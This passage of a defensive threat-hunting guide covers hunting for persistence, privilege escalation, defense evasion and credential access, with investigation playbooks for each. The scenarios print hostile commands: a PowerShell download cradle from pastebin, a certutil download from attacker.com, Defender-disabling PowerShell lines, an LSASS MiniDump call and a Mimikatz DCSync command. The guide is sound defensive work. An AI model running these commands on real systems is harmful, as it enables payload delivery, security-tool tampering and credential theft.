# 🎯 Threat Hunting SOC Guide — Part 2: Persistence, Priv Esc, Defense Evasion & Credential Access

---

# PART 2: ATT&CK TACTICS — PERSISTENCE THROUGH CREDENTIAL ACCESS

---

## 6. TA0003 — Persistence

#### Overview
After gaining initial access, adversaries install **backdoors** and mechanisms to survive system reboots, credential resets, and remediation attempts. Persistence is one of the **most critical** hunting areas because removing it is essential to eradication.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1547.001 | Registry Run Keys / Startup Folder | Auto-execute on login | Sysmon 13, Registry audit |
| T1053.005 | Scheduled Task | Execute at interval/trigger | Event 4698, Sysmon 1 |
| T1543.003 | Windows Service | Create service for persistence | Event 7045, 4697 |
| T1136 | Create Account | Create new local/domain account | Event 4720, 4722 |
| T1098 | Account Manipulation | Add to privileged group, modify perms | Event 4728, 4732, 4756 |
| T1505.003 | Web Shell | Backdoor on web server | File integrity, Web logs |
| T1546.003 | WMI Event Subscription | Permanent WMI event consumer | WMI repository, Sysmon 19-21 |
| T1574.001 | DLL Search Order Hijacking | Plant DLL in search path | EDR, Sysmon 7 |
| T1137 | Office Application Startup | Office add-in/template injection | Registry, File monitoring |
| T1556 | Modify Authentication Process | Install password filter DLL | Registry, EDR |
| T1078 | Valid Accounts | Maintain access with stolen creds | Auth logs, UEBA |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Registry Run Key additions | Sysmon Event 13 | New values in `HKLM\...\Run`, `HKCU\...\Run`, `RunOnce` keys |
| New scheduled tasks | Event 4698 | Tasks created by non-admin users; tasks pointing to `TEMP`, `AppData`, `ProgramData` |
| New services | Event 7045 | Services with unusual names, running from user directories, PowerShell in service path |
| New user accounts | Event 4720 | Accounts created outside of provisioning tools or change windows |
| Group membership changes | Event 4728/4732/4756 | Users added to Domain Admins, Local Admins, or other privileged groups |
| Web shells | File integrity monitoring | New .aspx, .jsp, .php files in web directories (wwwroot, inetpub, webapps) |
| WMI persistence | Sysmon 19, 20, 21 | New WMI Event Filters, Consumers, and Consumer-to-Filter bindings |
| Startup folder items | Sysmon Event 11 | New .lnk, .bat, .vbs, .exe files in Startup folders |
| DLL hijacking | Sysmon Event 7 | Unsigned DLLs loaded from non-standard paths by legitimate processes |

#### ✅ True Positive Scenario — Scheduled Task Persistence (T1053.005)

**Scenario:** During a routine hunt, you discover a scheduled task named `WindowsDefenderHealthCheck` created on a domain controller by a non-admin service account. The task runs every 4 hours and executes: `C:\ProgramData\Microsoft\WindowsDefender\update.bat`.

**Investigation Steps:**
```
1. EXAMINE THE SCHEDULED TASK
   □ When was it created? (Event 4698 timestamp)
   □ Who created it? (Creator user/account in 4698)
   □ What is the trigger? (time-based, logon-based, event-based)
   □ What is the action? (binary path, arguments)
   □ Is it running as SYSTEM?

2. ANALYZE THE PAYLOAD
   □ Read contents of update.bat
   □ Does it download/execute additional payloads?
   □ Does it establish network connections (C2)?
   □ Does it invoke PowerShell with encoded commands?
   □ Hash the file and check VirusTotal

3. ASSESS LEGITIMACY
   □ Is "WindowsDefenderHealthCheck" a real Windows task? → NO
   □ Windows Defender tasks are in a different path → SUSPICIOUS
   □ Was this created during a change management window? → CHECK
   □ Does the IT team recognize this task? → ASK

4. CHECK FOR RELATED ACTIVITY
   □ What else did the creator account do before/after?
   □ Check process tree when the task executes
   □ Check for network connections during execution
   □ Search for same task name/payload across all endpoints
   □ Check if this is part of a broader compromise

5. RESPOND
   □ Disable the scheduled task immediately
   □ Capture the payload file for forensic analysis
   □ Check if the task executed and what it did
   □ Block the creator account if compromised
   □ Hunt for same persistence across all DCs and servers
   □ Create detection rule for task creation on DCs by non-admin accounts
```

**TP Confidence:** 🔴 CRITICAL — Fake Windows Defender task on DC running batch file from ProgramData = confirmed persistence.

#### ✅ True Positive Scenario — New Service Created (T1543.003)

**Scenario:** Event 7045 shows a new service named `SystemHealthMonitor` installed on a file server. The service binary path is: `cmd.exe /c powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/abc123')"`.

**Investigation Steps:**
```
1. EXAMINE THE SERVICE
   □ Event 7045 details: service name, display name, binary path, account
   □ Service binary = cmd.exe launching PowerShell → 🔴 CRITICAL
   □ PowerShell downloads from Pastebin → 🔴 MALICIOUS
   □ Who installed the service? (correlate with 4688/Sysmon)

2. DETERMINE IF SERVICE EXECUTED
   □ Check if the service started (Event 7036: service started)
   □ Check PowerShell logs (4104) for script block logging
   □ Check proxy logs for connection to pastebin.com
   □ Check EDR for process tree: services.exe → cmd.exe → powershell.exe

3. ANALYZE THE PAYLOAD
   □ Access the Pastebin URL (from sandboxed environment)
   □ What does the downloaded script do?
   □ Does it install additional persistence? Drop tools? Exfil data?

4. SCOPE THE COMPROMISE
   □ Search for same service name across all servers
   □ Check for other services with PowerShell in binary path
   □ Review the installing account's full activity timeline
   □ Look for lateral movement from/to this server

5. RESPOND
   □ Stop and disable the service
   □ Isolate the server from the network
   □ Delete the service registration
   □ Block pastebin.com raw URL at proxy (or specific URL)
   □ Reset credentials of the installing account
   □ Full forensic investigation of the server
   □ Hunt for same pattern environment-wide
```

**TP Confidence:** 🔴 CRITICAL — Service executing PowerShell download cradle from Pastebin = textbook persistence mechanism.

#### ✅ True Positive Scenario — Web Shell Deployed (T1505.003)

**Scenario:** File integrity monitoring alerts on a new file `error_handler.aspx` created in `C:\inetpub\wwwroot\` on the Exchange OWA server. The file was not part of any patch or deployment.

**Investigation Steps:**
```
1. EXAMINE THE FILE
   □ When was the file created? (check MFT/$SI timestamps)
   □ What process created it? (check Sysmon Event 11)
   □ Analyze file content: does it contain eval(), exec(), cmd functions?
   □ Hash the file → check VirusTotal for web shell signatures
   □ Compare to known web shell families (China Chopper, ASPXSPY, etc.)

2. CHECK WEB SERVER ACTIVITY
   □ Review IIS logs for requests to error_handler.aspx
   □ Who accessed it? Note source IPs
   □ What POST data was sent? (command execution?)
   □ Any authentication bypass patterns?

3. DETERMINE INITIAL ACCESS
   □ How did the attacker write to wwwroot?
   □ Check for ProxyShell/ProxyLogon/ProxyNotShell exploitation evidence
   □ Review Exchange health check results
   □ Check for CVE exploitation in IIS/Exchange logs

4. ASSESS IMPACT
   □ What commands were executed through the web shell?
   □ Was data exfiltrated?
   □ Was the web shell used to move laterally?
   □ Were additional web shells planted?

5. RESPOND
   □ Remove the web shell file (preserve copy for forensics)
   □ Patch the vulnerability used for initial access
   □ Search for other web shells in all web directories
   □ Review and reset all credentials on the Exchange server
   □ Check for privilege escalation from IIS service account
   □ Full Exchange security audit
   □ Create file integrity monitoring rule for web directories
```

**TP Confidence:** 🔴 CRITICAL — Unauthorized .aspx file in wwwroot on Exchange server = confirmed web shell.

---

## 7. TA0004 — Privilege Escalation

#### Overview
Adversaries elevate their access level from standard user to admin, SYSTEM, or domain admin. This is a **pivotal** moment in the attack chain — stopping privilege escalation limits the adversary's capabilities significantly.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1548.002 | Bypass UAC | Elevate from medium to high integrity | EDR, Sysmon |
| T1068 | Exploitation for Privilege Escalation | Exploit kernel/software vuln | EDR, Crash dumps |
| T1134 | Access Token Manipulation | Steal/impersonate tokens | Sysmon, Event 4688 |
| T1078 | Valid Accounts | Use admin creds obtained earlier | Auth logs (4624 Type 10, 3) |
| T1484 | Domain Policy Modification | Modify GPO for privilege | Event 5136, GPO audit |
| T1055 | Process Injection | Inject code into privileged process | EDR, Sysmon (Event 8, 10) |
| T1547.001 | Boot/Logon Autostart: Registry | Add to HKLM Run as SYSTEM | Sysmon 13 |
| T1611 | Escape to Host | Container escape to host OS | Container runtime logs, EDR |
| T1078.002 | Domain Accounts | Compromise domain admin creds | Active Directory logs |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| UAC bypass | EDR/Sysmon | Auto-elevating binaries spawning unexpected children (fodhelper.exe, eventvwr.exe, sdclt.exe) |
| Token manipulation | Sysmon/EDR | Processes using token impersonation (SeImpersonatePrivilege exploitation) |
| Kerberoasting → Admin | AD logs | 4769 (TGS requests) for SPNs of admin service accounts, followed by admin logon |
| DCSync | AD logs | DRS replication request from non-DC machine (Event 4662 with DS-Replication-Get-Changes) |
| GPO modification | Event 5136 | Unauthorized GPO changes granting privileges or deploying scripts |
| Process injection | Sysmon Event 8 | CreateRemoteThread into LSASS, SYSTEM processes, or browsers |
| Potato attacks | EDR | Named pipe impersonation (PrintSpoofer, JuicyPotato, SweetPotato) |

#### ✅ True Positive Scenario — UAC Bypass via Fodhelper (T1548.002)

**Scenario:** EDR detects `fodhelper.exe` (a Microsoft auto-elevating binary) spawning `cmd.exe` with high integrity. The user account is a standard domain user on a workstation.

**Investigation Steps:**
```
1. ANALYZE THE PROCESS CHAIN
   □ Process tree: explorer.exe → fodhelper.exe → cmd.exe (HIGH INTEGRITY)
   □ Check if registry key was modified before execution:
     HKCU\Software\Classes\ms-settings\shell\open\command
   □ What command was set in the registry? (the actual payload)
   □ This is a well-known UAC bypass technique → 🔴

2. CHECK PRE-BYPASS ACTIVITY
   □ How did the attacker get to this point?
   □ Check for initial access vector (phishing, exploitation?)
   □ What commands were run before the UAC bypass?
   □ What user account was used?

3. POST-BYPASS INVESTIGATION
   □ What elevated commands were executed after bypass?
   □ Check for credential dumping (LSASS access)
   □ Check for persistence creation (now with admin rights)
   □ Check for security tool tampering (disabling AV/EDR)
   □ Check for lateral movement attempts

4. RESPOND
   □ Isolate the endpoint
   □ Kill the malicious process tree
   □ Clean the registry modification
   □ Determine full scope of compromise
   □ Check for same technique on other workstations
   □ Reset user credentials
   □ Create detection for fodhelper UAC bypass pattern
```

**TP Confidence:** 🔴 CRITICAL — Registry modification + fodhelper.exe spawning elevated cmd.exe = confirmed UAC bypass.

#### ✅ True Positive Scenario — Kerberoasting Leading to Domain Admin (T1558.003)

**Scenario:** SIEM detects a workstation issuing 50+ TGS (Kerberos Ticket Granting Service) requests in 2 minutes, requesting tickets for multiple service accounts including `svc_sql_admin`, `svc_backup`, and `svc_exchange`.

**Investigation Steps:**
```
1. IDENTIFY KERBEROASTING
   □ Event 4769 (Kerberos Service Ticket Operations)
   □ Filter for encryption type: 0x17 (RC4-HMAC) → weak, crackable
   □ High volume of TGS requests from single workstation → 🔴
   □ Requests for multiple SPNs in short timeframe → KERBEROASTING

2. CHECK THE SOURCE
   □ Which workstation/user initiated the requests?
   □ What tool was used? (Rubeus, Invoke-Kerberoast, GetUserSPNs.py)
   □ Check for PowerShell or command line evidence
   □ Is this a normal admin activity? → Almost certainly NOT

3. ASSESS CRACKING RISK
   □ Which service accounts had tickets requested?
   □ Are these accounts domain admins or have elevated privileges?
   □ What are the password policies for these service accounts?
   □ Were passwords complex enough to resist cracking?

4. CHECK FOR FOLLOW-UP
   □ After Kerberoasting: did any service accounts log in from unusual sources?
   □ Check 4624 events for service accounts from workstations (not servers)
   □ Check for privilege escalation with cracked credentials
   □ Check for lateral movement using service accounts

5. RESPOND
   □ Force password reset on ALL targeted service accounts immediately
   □ Change to complex passwords (25+ characters)
   □ Investigate the source workstation for compromise
   □ Convert service accounts to Group Managed Service Accounts (gMSA)
   □ Disable RC4 encryption for Kerberos (require AES)
   □ Enable Kerberoasting detection rule in SIEM
   □ Review all SPNs for unnecessary registrations
   □ Isolate the source workstation
```

**TP Confidence:** 🔴 CRITICAL — Mass TGS requests with RC4 encryption for multiple service accounts = confirmed Kerberoasting.

---

## 8. TA0005 — Defense Evasion

#### Overview
Adversaries attempt to **avoid detection** by disabling security tools, obfuscating code, clearing logs, masquerading as legitimate processes, and using living-off-the-land techniques. This is the **most diverse** tactic with 40+ techniques.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1562.001 | Disable/Modify Security Tools | Disable AV, EDR, firewall | EDR tamper protection, Event 7045 |
| T1070.001 | Clear Windows Event Logs | Delete evidence | Event 1102 (Security log cleared) |
| T1070.004 | File Deletion | Remove tools after use | Sysmon 23 (File Delete), EDR |
| T1036 | Masquerading | Rename malware to look legitimate | Sysmon 1, EDR (hash mismatch) |
| T1027 | Obfuscated Files/Information | Encode/encrypt payloads | Script logging (4104), EDR |
| T1218 | System Binary Proxy Execution | Use LOLBins (mshta, rundll32) | Sysmon 1, EDR |
| T1055 | Process Injection | Inject code into legitimate process | Sysmon 8, 10, EDR |
| T1140 | Deobfuscate/Decode Files | Decode payload at runtime | EDR, Script logging |
| T1112 | Modify Registry | Alter configs to disable security | Sysmon 13 |
| T1497 | Virtualization/Sandbox Evasion | Detect analysis environment | EDR (anti-analysis behavior) |
| T1564.001 | Hidden Files and Directories | Hide tools in hidden paths | File system audit |
| T1202 | Indirect Command Execution | Use forfiles, pcalua, etc. | Sysmon 1, EDR |
| T1553.002 | Code Signing | Use stolen/forged certificates | Sysmon 7, Certificate audit |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Security log clearing | Event 1102, 104 | Any security/system log cleared (ALWAYS investigate) |
| AV/EDR tampering | EDR tamper logs | Services stopped (Defender, CrowdStrike, SentinelOne), exclusions added |
| Masquerading | Sysmon 1 | Processes with legitimate names running from unusual paths (svchost.exe from C:\TEMP) |
| LOLBin abuse | Sysmon 1 | mshta.exe, rundll32.exe, certutil.exe, regsvr32.exe with download/exec arguments |
| Process injection | Sysmon 8, 10 | CreateRemoteThread/OpenProcess to sensitive processes (LSASS, winlogon.exe) |
| AMSI bypass | PowerShell 4104 | Scripts containing `AmsiUtils`, `amsiInitFailed`, `AmsiScanBuffer` |
| Timestomping | NTFS analysis | $SI timestamp differs from $FN timestamp on suspicious files |
| Defender exclusions | Registry/MDI | New exclusions added to Windows Defender via PowerShell or registry |

#### ✅ True Positive Scenario — Security Event Logs Cleared (T1070.001)

**Scenario:** SIEM fires Event 1102 (The audit log was cleared) on a domain controller. The log was cleared at 2:47 AM by user `svc_backup`.

**Investigation Steps:**
```
1. IMMEDIATE ASSESSMENT — THIS IS ALWAYS SERIOUS ON A DC
   □ Event 1102 details: Who cleared the log? When? From which session?
   □ Clearing Security logs on a DC is NEVER normal → 🔴 CRITICAL
   □ This is anti-forensic behavior → assume active compromise
   □ Check if other logs were also cleared (System, PowerShell, Sysmon)

2. INVESTIGATE THE ACCOUNT
   □ Is svc_backup a legitimate service account?
   □ When did svc_backup last authenticate? From where?
   □ Check 4624 events before the clearing (source IP, logon type)
   □ Was svc_backup's password recently changed?
   □ Does svc_backup normally log into DCs interactively?

3. RECOVER EVIDENCE
   □ Check if Sysmon logs are still intact (separate log channel)
   □ Check centralized SIEM — logs forwarded before clearing
   □ Check other DCs for related activity
   □ Review network logs (firewall, DNS, proxy) for the DC
   □ Check EDR telemetry for the DC

4. RECONSTRUCT PRE-CLEARING ACTIVITY
   □ What happened on the DC before logs were cleared?
   □ Check for DCSync (Event 4662 with Replication permissions)
   □ Check for NTDS.dit access or shadow copy creation
   □ Check for account creation or privilege escalation
   □ Check for Golden Ticket / Pass-the-Hash indicators

5. RESPOND — TREAT AS CRITICAL INCIDENT
   □ Escalate to IR team immediately
   □ Reset svc_backup password
   □ Reset KRBTGT password (twice with 12-hour interval)
   □ Audit all privileged accounts on the DC
   □ Full forensic acquisition of the DC
   □ Check all DCs for compromise indicators
   □ Enable enhanced logging and tamper protection
   □ Consider the entire domain potentially compromised
```

**TP Confidence:** 🔴 CRITICAL — Security logs cleared on a domain controller = ALWAYS treat as active compromise.

#### ✅ True Positive Scenario — LOLBin Abuse: Certutil for Download (T1218, T1105)

**Scenario:** EDR alerts on `certutil.exe` executing with the following command line on a workstation:
```
certutil.exe -urlcache -split -f http://attacker.com/payload.dll C:\Users\Public\payload.dll
```

**Investigation Steps:**
```
1. ANALYZE THE COMMAND
   □ certutil.exe used as download tool → classic LOLBin abuse
   □ -urlcache -split -f = download mode
   □ Source: http://attacker.com/payload.dll → external URL
   □ Destination: C:\Users\Public → world-writable directory
   □ This is MALICIOUS → 🔴

2. CHECK EXECUTION CONTEXT
   □ What user ran this command?
   □ What was the parent process? (cmd.exe? powershell.exe? wscript.exe?)
   □ Check full process hierarchy to determine root cause
   □ Was this human-initiated or automated?

3. ANALYZE THE PAYLOAD
   □ Was payload.dll successfully downloaded? (check file system)
   □ Hash the DLL → check VirusTotal
   □ Was the DLL executed? (check Sysmon Event 1 for rundll32 or 7 for DLL load)
   □ Submit to sandbox for analysis

4. NETWORK INVESTIGATION
   □ Check DNS for attacker.com resolution
   □ Check proxy/firewall logs for the download
   □ Was the download successful (HTTP 200)?
   □ Check for subsequent C2 connections from the host

5. RESPOND
   □ Isolate the workstation
   □ Delete the downloaded payload
   □ Block attacker.com at DNS and proxy
   □ Block the payload hash at EDR
   □ Check for same domain/C2 across all endpoints
   □ Create detection for certutil download pattern
   □ Consider application control / AppLocker for certutil
```

**TP Confidence:** 🔴 HIGH — Certutil downloading DLL from external URL to Users\Public = confirmed LOLBin abuse.

#### ✅ True Positive Scenario — Disabling Windows Defender (T1562.001)

**Scenario:** SIEM observes the following PowerShell command executed on a server:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Crypto"
```

**Investigation Steps:**
```
1. IMMEDIATE ASSESSMENT
   □ Three-pronged Defender disablement:
     - Real-time monitoring disabled
     - AntiSpyware policy disabled via registry
     - Exclusion added for specific path
   □ This is DEFENSIVE PREPARATION before payload deployment → 🔴

2. CHECK WHAT FOLLOWED
   □ What files were created/modified in C:\ProgramData\Microsoft\Crypto?
   □ Was malware dropped in the excluded path?
   □ Check for additional tool deployment (Mimikatz, Cobalt Strike)
   □ Check for lateral movement from this server

3. INVESTIGATE THE ACTOR
   □ Who ran these commands? (user from 4688/4104)
   □ How did they get access to the server?
   □ What privileges do they have?
   □ Check their activity timeline (before and after)

4. SCOPE ASSESSMENT
   □ Were Defender settings modified on other servers/workstations?
   □ Search for same PowerShell commands across environment
   □ Check for similar exclusion paths on other endpoints
   □ Has the adversary deployed ransomware preparation?

5. RESPOND
   □ Re-enable Windows Defender immediately
   □ Remove the malicious exclusion
   □ Remove the DisableAntiSpyware registry key
   □ Scan the excluded directory (C:\ProgramData\Microsoft\Crypto)
   □ Isolate the server if malware is confirmed
   □ Enable Defender Tamper Protection
   □ Deploy GPO to prevent local Defender modification
   □ Hunt for ransomware preparation indicators
```

**TP Confidence:** 🔴 CRITICAL — Systematic Defender disablement = adversary preparing for payload deployment.

---

## 9. TA0006 — Credential Access

#### Overview
Stealing credentials is often the **primary objective** of adversaries after initial access. With valid credentials, attackers can move laterally, escalate privileges, and maintain persistence — all while appearing as legitimate users.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1003.001 | OS Credential Dumping: LSASS | Dump LSASS process memory | Sysmon 10, EDR |
| T1003.002 | SAM Database | Extract local account hashes | Sysmon 1, Event 4688 |
| T1003.003 | NTDS.dit | Extract AD database (all domain hashes) | Event 4662, Volume Shadow Copy |
| T1003.006 | DCSync | Simulate DC replication to steal hashes | Event 4662 (DS-Replication) |
| T1558.003 | Kerberoasting | Request/crack service account TGS tickets | Event 4769 (RC4) |
| T1558.004 | AS-REP Roasting | Crack accounts without pre-auth | Event 4768 |
| T1110 | Brute Force | Password spraying, credential stuffing | Event 4625 (mass failures) |
| T1555 | Credentials from Password Stores | Browser creds, vault, credential mgr | EDR, File access logs |
| T1556 | Modify Authentication Process | Password filter DLL, SSP | Registry, EDR |
| T1539 | Steal Web Session Cookie | Extract browser session tokens | EDR, Browser forensics |
| T1552.001 | Credentials in Files | Search for passwords in config files | EDR, File access logs |
| T1557.001 | LLMNR/NBT-NS Poisoning | Responder-style credential interception | Network monitor, Event 4624 |
| T1187 | Forced Authentication | Force NTLM auth to attacker | Network logs, Sysmon 3 |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| LSASS access | Sysmon Event 10 | GrantedAccess to LSASS process with 0x1010 or 0x1FFFFF (full access) |
| Mimikatz patterns | EDR/Sysmon | Process creating `sekurlsa::logonpasswords`, `lsadump::dcsync` strings |
| Password spraying | Event 4625 | Same password tried against 10+ accounts in < 10 min |
| DCSync | Event 4662 | DS-Replication-Get-Changes-All from non-DC computer account |
| SAM/SECURITY hive dump | Event 4688/Sysmon 1 | reg.exe save HKLM\SAM, HKLM\SECURITY, or NTDS.dit copy |
| Credential file hunting | EDR | findstr /si "password" in config files, batch scripts |
| NTDS.dit extraction | Event 4688 | ntdsutil, vssadmin create shadow, esentutl usage on DC |
| Kerberoasting | Event 4769 | TGS requests with 0x17 (RC4) for multiple service SPNs |
| AS-REP Roasting | Event 4768 | AS-REP responses without pre-authentication |
| Responder/LLMNR poisoning | Network | LLMNR (5355) or NBT-NS (137) responses from non-DNS servers |

#### ✅ True Positive Scenario — LSASS Credential Dumping (T1003.001)

**Scenario:** Sysmon Event 10 fires showing process `rundll32.exe` accessing `lsass.exe` with GrantedAccess `0x1FFFFF` (PROCESS_ALL_ACCESS). The calling process path is `C:\Windows\Temp\debug.dll` loaded via `rundll32.exe C:\Windows\Temp\debug.dll,MiniDump`.

**Investigation Steps:**
```
1. CONFIRM LSASS ACCESS
   □ Sysmon Event 10: SourceImage, TargetImage = lsass.exe
   □ GrantedAccess = 0x1FFFFF (full access) → 🔴 CRITICAL
   □ Source is rundll32 loading DLL from Windows\Temp → ABNORMAL
   □ This is credential dumping behavior → CONFIRMED MALICIOUS

2. ANALYZE THE TOOL
   □ Hash debug.dll → check VirusTotal
   □ Is this Mimikatz, nanodump, lsassy, or custom tool?
   □ When was debug.dll dropped? (Sysmon Event 11)
   □ What process dropped it?

3. CHECK FOR DUMP FILE
   □ Was a minidump file created? (check for .dmp files)
   □ Where was the dump saved? (TEMP, user profile)
   □ Was the dump exfiltrated? (check network logs)

4. ASSESS BLAST RADIUS
   □ LSASS memory contains: NTLM hashes, Kerberos tickets, plaintext creds
   □ ALL users who logged into this machine are compromised
   □ List all users with recent logon sessions on this host
   □ Check 4624 events for logon type 2, 10, 7 (interactive, remote, reconnect)

5. POST-DUMP ACTIVITY
   □ Check for Pass-the-Hash (4624 Type 3 with NTLM)
   □ Check for lateral movement from this host
   □ Check for Golden Ticket / Silver Ticket usage
   □ Check for privilege escalation with dumped creds

6. RESPOND — TREAT AS CRITICAL
   □ Isolate the endpoint immediately
   □ Delete debug.dll and any dump files
   □ Reset passwords for ALL users who logged into this machine
   □ Reset the KRBTGT account if domain admin creds were dumped
   □ Force Kerberos ticket renewal
   □ Hunt for same tool/hash across the environment
   □ Enable Credential Guard if possible
   □ Enable LSASS PPL (Protected Process Light)
   □ Create detection for LSASS access patterns
```

**TP Confidence:** 🔴 CRITICAL — Full access to LSASS from a temp DLL via rundll32 = confirmed credential dumping.

#### ✅ True Positive Scenario — DCSync Attack (T1003.006)

**Scenario:** Event 4662 on a domain controller shows replication rights (`DS-Replication-Get-Changes-All`) exercised by computer account `WORKSTATION12$` — which is a standard workstation, NOT a domain controller.

**Investigation Steps:**
```
1. CONFIRM DCSYNC
   □ Event 4662: Object Type = Domain
   □ Properties include: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}
     = DS-Replication-Get-Changes-All → 🔴
   □ Account performing replication: WORKSTATION12$ → NOT A DC → 🔴 CRITICAL
   □ Only domain controllers should perform replication

2. IDENTIFY THE ATTACKER'S TOOL
   □ What process on WORKSTATION12 initiated the replication?
   □ Check Sysmon logs on WORKSTATION12 for Mimikatz/Rubeus/SharpKatz
   □ Common commands: lsadump::dcsync /domain:corp.com /user:krbtgt

3. DETERMINE WHAT WAS REPLICATED
   □ What user accounts were targeted?
   □ Was KRBTGT replicated? (enables Golden Ticket)
   □ Were domain admin accounts replicated?
   □ Check for multiple 4662 events (one per account replicated)

4. ASSESS IMPACT — THIS IS DOMAIN COMPROMISE
   □ IF KRBTGT was replicated → adversary can create Golden Tickets
   □ IF Domain Admin was replicated → immediate full domain access
   □ ALL replicated account passwords must be considered stolen

5. RESPOND — CRITICAL INCIDENT
   □ Isolate WORKSTATION12 immediately
   □ This is a P1/SEV1 incident → escalate to IR team
   □ Reset ALL replicated account passwords
   □ Reset KRBTGT password (twice, 12-hour interval)
   □ Reset Domain Admin passwords
   □ Full investigation of WORKSTATION12 (how was it compromised?)
   □ Review AD permissions — remove unnecessary replication rights
   □ Enable AD monitoring for replication from non-DC sources
   □ Consider the entire domain COMPROMISED until proven otherwise
   □ Engage executive leadership for incident communication
```

**TP Confidence:** 🔴 CRITICAL — DCSync from non-DC workstation = CONFIRMED DOMAIN COMPROMISE. This is the highest severity finding possible.

#### ✅ True Positive Scenario — Password Spraying Attack (T1110.003)

**Scenario:** SIEM correlation rule fires: 200+ unique accounts experienced 4625 (Logon Failure) with error `0xC000006A` (wrong password) from the same source IP within 15 minutes. 3 accounts then showed successful 4624 logons.

**Investigation Steps:**
```
1. CONFIRM PASSWORD SPRAY PATTERN
   □ Same password attempted against many accounts → spray (not brute force)
   □ Failure reason 0xC000006A (bad password) consistently
   □ Source IP: internal workstation or external?
   □ Time between attempts: automated (< 1 second apart)?
   □ 200+ targets in 15 min → 🔴 AUTOMATED ATTACK TOOL

2. IDENTIFY SUCCESSFUL COMPROMISES
   □ Which 3 accounts had successful logon after failures?
   □ Are these accounts privileged? (admin, service, executive)
   □ What logon type? (Type 3 = network, Type 10 = RDP)
   □ What did the attacker do after successful logon?

3. TRACE THE SOURCE
   □ If internal IP: which endpoint? Who is logged in?
   □ Check for attack tools (Spray, CrackMapExec, Ruler)
   □ If external IP: VPN? Web portal? RDP gateway?
   □ Check if IP is on threat intel blacklists

4. POST-COMPROMISE ACTIVITY
   □ For each compromised account:
     □ Check for lateral movement (4624 from new hosts)
     □ Check for privilege escalation
     □ Check for persistence mechanisms
     □ Check for data access or exfiltration
   □ Did the attacker spray again with compromised account creds?

5. RESPOND
   □ Lock/reset all 3 compromised accounts immediately
   □ Force password change for all targeted accounts
   □ Block the source IP
   □ If internal: isolate the source workstation → investigate
   □ Enable account lockout policy (if not already)
   □ Implement smart lockout / progressive delays
   □ Enforce MFA for all accounts
   □ Review password policy (complexity, length, banned passwords)
   □ Deploy Microsoft AD Password Protection for banned passwords
   □ Create alerting for spray patterns (low-and-slow too)
```

**TP Confidence:** 🔴 HIGH — 200+ failed logins from one source with successful compromises = confirmed password spray.

---

## 10. Defense Evasion & Credential Access — Quick Reference Checklist

### 10.1 Defense Evasion Detection Checklist

```
┌───────────────────────────────────────────────────────────────────────┐
│               DEFENSE EVASION HUNTING CHECKLIST                       │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  LOG TAMPERING                                                        │
│  □ Search for Event 1102 (Security log cleared)                      │
│  □ Search for Event 104 (System log cleared)                         │
│  □ Check for gaps in event log timeline                              │
│  □ Check for wevtutil or Clear-EventLog commands                     │
│                                                                       │
│  SECURITY TOOL TAMPERING                                              │
│  □ Check for AV/EDR service stoppage or crashes                      │
│  □ Search for Defender exclusion additions (PowerShell, Registry)    │
│  □ Check for tamper protection bypass attempts                       │
│  □ Monitor for driver-based security tool bypass (BYOVD)             │
│                                                                       │
│  PROCESS MASQUERADING                                                 │
│  □ Verify svchost.exe running only from C:\Windows\System32          │
│  □ Verify csrss.exe, lsass.exe in expected paths                    │
│  □ Check for unsigned binaries with Microsoft-like names             │
│  □ Compare file hash vs expected hash for system binaries            │
│                                                                       │
│  LOLBIN ABUSE                                                         │
│  □ Monitor mshta.exe, certutil.exe, bitsadmin.exe for downloads     │
│  □ Monitor rundll32.exe for unusual DLL loads                        │
│  □ Monitor regsvr32.exe for /s /n /u /i:URL patterns                │
│  □ Check for wmic process call create with suspicious commands       │
│                                                                       │
│  OBFUSCATION                                                          │
│  □ Check PowerShell 4104 logs for encoded commands                   │
│  □ Look for string concatenation evasion ("po" + "wer" + "shell")   │
│  □ Check for AMSI bypass patterns in script logs                     │
│  □ Monitor for base64 decode operations (certutil -decode)           │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

### 10.2 Credential Access Detection Checklist

```
┌───────────────────────────────────────────────────────────────────────┐
│              CREDENTIAL ACCESS HUNTING CHECKLIST                      │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  LSASS / CREDENTIAL DUMPING                                           │
│  □ Monitor Sysmon 10 for LSASS access (0x1010, 0x1FFFFF)            │
│  □ Check for procdump.exe, comsvcs.dll MiniDump usage                │
│  □ Monitor for .dmp files created in temp directories                │
│  □ Check for task manager creating LSASS dump                        │
│                                                                       │
│  ACTIVE DIRECTORY ATTACKS                                             │
│  □ Monitor Event 4769 for mass TGS requests (Kerberoasting)         │
│  □ Monitor Event 4768 for AS-REP roasting patterns                   │
│  □ Monitor Event 4662 for DCSync (replication from non-DC)          │
│  □ Check for NTDS.dit access (vssadmin, ntdsutil)                   │
│                                                                       │
│  BRUTE FORCE / PASSWORD SPRAY                                        │
│  □ Monitor Event 4625 for mass failures (same source, many targets) │
│  □ Check for slow-and-low spray (1 attempt per account per hour)    │
│  □ Monitor for failures followed by success (spray + compromise)    │
│  □ Check for credential stuffing from leaked password lists          │
│                                                                       │
│  CREDENTIAL HARVESTING                                                │
│  □ Check for browser credential file access                         │
│  □ Monitor for credential manager access                             │
│  □ Check for LaZagne, SharpChrome, SharpDPAPI usage                  │
│  □ Monitor for keylogger artifacts                                   │
│                                                                       │
│  NETWORK CREDENTIAL INTERCEPTION                                      │
